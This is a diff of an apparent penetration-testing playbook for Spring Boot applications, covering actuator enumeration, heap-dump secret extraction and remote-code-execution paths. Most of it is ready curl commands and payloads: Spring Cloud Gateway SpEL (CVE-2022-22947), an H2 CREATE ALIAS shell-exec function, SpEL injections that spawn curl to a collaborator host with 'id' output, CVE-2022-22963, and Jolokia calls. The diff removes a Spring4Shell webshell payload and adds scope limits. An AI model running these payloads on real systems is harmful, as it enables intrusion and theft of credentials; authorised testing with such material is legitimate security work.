@@ -14,7 +14,7 @@ Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets i
 **Highest-value findings:**
 - **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
 - **`/actuator/env`** — lists all environment variables and Spring properties including secrets
-- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
+- **`/actuator/shutdown`** — if the actuator index lists it, record that. **Never POST it** (that kills the process; DoS is out of scope)
 - **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
 - **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
 - **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding
@@ -52,24 +52,30 @@ done
 ## Phase 2 — Actuator Endpoint Enumeration
 
 ```bash
-BASE="https://$TARGET/actuator"
-
-# High-impact endpoints
+# High-impact endpoints. GET only — never POST shutdown, refresh, or restart.
+# Boot 1.x serves these at the root (/env, /heapdump), Boot 2/3 under /actuator.
 ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
-           "loggers" "info" "health" "configprops" "shutdown" "trace"
+           "loggers" "info" "health" "configprops" "trace"
            "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
-           "flyway" "liquibase" "refresh" "restart")
+           "flyway" "liquibase" "gateway/routes" "jolokia")
 
-for EP in "${ENDPOINTS[@]}"; do
-  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
-  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
-  # before calling it EXPOSED.
-  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
-  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
-  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
-    echo "[+] EXPOSED: $BASE/$EP"
-  fi
+for BASE in "https://$TARGET/actuator" "https://$TARGET"; do
+  for EP in "${ENDPOINTS[@]}"; do
+    if [ "$EP" = "heapdump" ]; then
+      # hprof magic. Do not slurp the dump in the enum loop (it is hundreds of MB).
+      MAGIC=$(curl -s -r 0-20 "$BASE/$EP")
+      printf '%s' "$MAGIC" | grep -q "JAVA PROFILE" && echo "[+] HEAPDUMP: $BASE/$EP"
+      continue
+    fi
+    # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login page.
+    BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP" | head -c 500)
+    printf '%s' "$BODY" | grep -qi "Whitelabel Error Page\|<html" && continue
+    # Spring-shaped JSON only. A generic /health {"status":"UP"} is not an actuator hit.
+    printf '%s' "$BODY" | grep -Eq 'propertySources|"beans"|dispatcherServlets|requestMapping|"contexts"|jolokia|"agent"|predicates' \
+      && echo "[+] EXPOSED: $BASE/$EP"
+  done
 done
+BASE="https://$TARGET/actuator"   # loop leaves BASE on the root; later calls are Boot 2/3
 
 # Get environment variables (passwords, API keys)
 curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20
@@ -84,14 +90,20 @@ curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
 ### Actuator-driven RCE paths (when write endpoints are exposed)
 
 ```bash
-# A) Spring Cloud Gateway SpEL (CVE-2022-22947) — /actuator/gateway/routes writable
+# A) Spring Cloud Gateway SpEL (CVE-2022-22947) — 3.1.0, 3.0.0–3.0.6 (fixed
+#    3.1.1 / 3.0.7), and older 2.x when the actuator routes API is exposed.
+#    If POST /actuator/gateway/routes returns 201, run this even without a version
+#    banner. SpEL runs on POST /actuator/gateway/refresh and the
+#    command output is stored in the route. Read THAT JSON. StreamUtils is on
+#    the Spring classpath (Java 8+); InputStream.readAllBytes() is not.
+#    "order" is required on some 3.0.x builds or route build NPEs.
 curl -s -X POST "$BASE/gateway/routes/huntroute" -H "Content-Type: application/json" -d '{
   "id":"huntroute","filters":[{"name":"AddResponseHeader","args":{
-    "name":"X-Hunt","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}"}}],
-  "uri":"http://example.com","predicates":[{"name":"Path","args":{"_genkey_0":"/hunt/**"}}]}'
+    "name":"X-Hunt","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
+  "uri":"http://example.com","order":0,"predicates":[{"name":"Path","args":{"_genkey_0":"/hunt/**"}}]}'
 curl -s -X POST "$BASE/gateway/refresh"
-curl -si "https://$TARGET/hunt/x" | grep -i "X-Hunt"      # header carries command output
-curl -s -X DELETE "$BASE/gateway/routes/huntroute"; curl -s -X POST "$BASE/gateway/refresh"  # clean up
+curl -s "$BASE/gateway/routes/huntroute" | grep -a "uid="
+curl -s -X DELETE "$BASE/gateway/routes/huntroute"; curl -s -X POST "$BASE/gateway/refresh"
 
 # B) /actuator/env property injection → RCE (when env is WRITABLE via POST, older setups).
 #    Point a reloadable datasource/log4j/eureka property at an attacker URL, then /refresh.
@@ -107,7 +119,10 @@ curl -s -X DELETE "$BASE/gateway/routes/huntroute"; curl -s -X POST "$BASE/gatew
 curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
 ls -lh /tmp/heapdump.hprof
 
-# Quick grep for secrets in heap dump (binary file — use strings)
+# Quick grep for secrets in heap dump (binary file — use strings).
+# Quote one live secret in the report. Do not attach the hprof.
+# /actuator/env values of ****** are masked, not a leak — the dump or
+# /actuator/env/<exact.property.name> is where the raw value still shows.
 strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
   grep -v "^[a-z_]" | sort -u | head -50
 
@@ -131,16 +146,16 @@ curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
 curl -s "https://$TARGET/h2" | grep -i "H2 Console"
 curl -s "https://$TARGET/console" | grep -i "H2"
 
-# Default credentials: sa / (empty password)
-# JDBC URL: jdbc:h2:mem:testdb
+# Default credentials (one try): sa / empty password. Not a wordlist.
+# JDBC URL: the one the login page or spring.datasource.url already shows.
+# A mem DB you just created is not the application's database.
 
-# If accessible, RCE via CREATE ALIAS:
-# SQL to execute:
+# RCE via CREATE ALIAS, one statement, Java 8-safe (no readAllBytes).
+# H2 2.x often rejects Java aliases — the rejection is SQL access, not RCE.
 # CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
-#   Runtime rt = Runtime.getRuntime();
-#   String[] commands = {"sh","-c",cmd};
-#   Process proc = rt.exec(commands);
-#   return new String(proc.getInputStream().readAllBytes());
+#   Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
+#   java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
+#   return s.hasNext() ? s.next() : "";
 # } $$;
 # CALL EXEC('id');
 ```
@@ -163,18 +178,20 @@ curl -s "https://$TARGET/console" | grep -i "H2"
 curl -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
   -d '{"name": "#{7*7}"}'
-# If returns 49 → SpEL injection confirmed
+# If returns 49 → SpEL detection. RCE is the callback / uid= below, not the 49.
 
 # RCE payload — note: exec() returns a Process, not a String, so a bare
 # exec("id") produces NO visible output. Confirm via an OOB curl callback
-# (the spawned curl makes the network request even though nothing is reflected):
+# (the spawned curl makes the network request even though nothing is reflected).
+# Runtime.exec(String) is not a shell — use String[] (or sh -c). curl needs a scheme:
 curl -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
-  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'
+  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl http://UNIQUE.collab/$(id|base64)\"})}"}'
 
-# CVE-2022-22963 — Spring Cloud Function SpEL
+# CVE-2022-22963 — Spring Cloud Function 3.0.x, 3.1.0–3.1.6, 3.2.0–3.2.2
+# (fixed 3.1.7 / 3.2.3) plus /functionRouter. Probe when that header is accepted.
 curl -s -X POST "https://$TARGET/functionRouter" \
-  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
+  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/"})' \
   -d "test"
 ```
 
@@ -192,9 +209,10 @@ curl -s "https://$TARGET/api/user" \
   -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
 # Check COLLAB for HTTP callback
 
-# Exploitation: write webshell via class loader
-curl -s "https://$TARGET/login" \
-  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+# Proof is the classloader fetch, not a JSP left on disk.
+# A Collaborator hit on the URL below means data binding reached the Tomcat classloader
+# (CVE-2022-22965). Do not set AccessLogValve prefix/suffix to write a .jsp webshell.
+# No callback = not proven, even if the parameter did not 400.
 ```
 
 ---
@@ -213,8 +231,14 @@ curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep
 curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
   python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"
 
-# Exec MBean operations (potential RCE via MLet)
-curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
+# compilerDirectivesAdd is a file READ (contents often land in the error text), not RCE.
+# One path you already know exists, e.g. /etc/hostname. Stop. Do not walk the disk.
+# curl -s "$BASE/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc/hostname"
+
+# reloadByURL is SSRF: one GET, proof is your HTTP callback. Escape slashes as !/.
+# Logback insertFromJNDI remote class loading does not work on current JDKs
+# (trustURLCodebase=false). A callback is not RCE. Do not stand up an RMI/LDAP shell.
+# curl -s "$BASE/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/UNIQUE.collab!/x"
 ```
 
 ---
@@ -228,8 +252,8 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 | `/actuator/env` | Read all env vars including secrets | High |
 | H2 console accessible | CREATE ALIAS → RCE | Critical |
 | SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
-| Spring4Shell | Write webshell → RCE | Critical |
-| Jolokia + MLet | Remote code via MBean | Critical RCE |
+| Spring4Shell | Classloader URL fetch (callback). Do not write a JSP | Critical only after the callback or a command marker |
+| Jolokia `reloadByURL` | HTTP callback = SSRF (`hunt-ssrf`). File bytes from `compilerDirectivesAdd` = file read. Not RCE on current JDKs | High when a secret or an internal body comes back |
 
 ---
 
@@ -239,7 +263,8 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 ✅ Actuator/env: real secrets visible in JSON response (not just masked `******`)
 ✅ Gateway SpEL RCE: command output lands in the response header OR OOB callback on a unique subdomain
 ✅ SpEL: `#{7*7}`→49 reflected, then RCE confirmed by command output or OOB (unique subdomain) — not "no error"
-✅ H2 console: SQL executed, `CALL EXEC('id')` output returned
+✅ H2 console: `CALL EXEC('id')` output returned. Alias rejected = SQL console only
+✅ Jolokia: a secret in the JSON, file bytes, or one callback. Not "list returned 200"
 
 **Severity:**
 - Heapdump with credentials: Critical
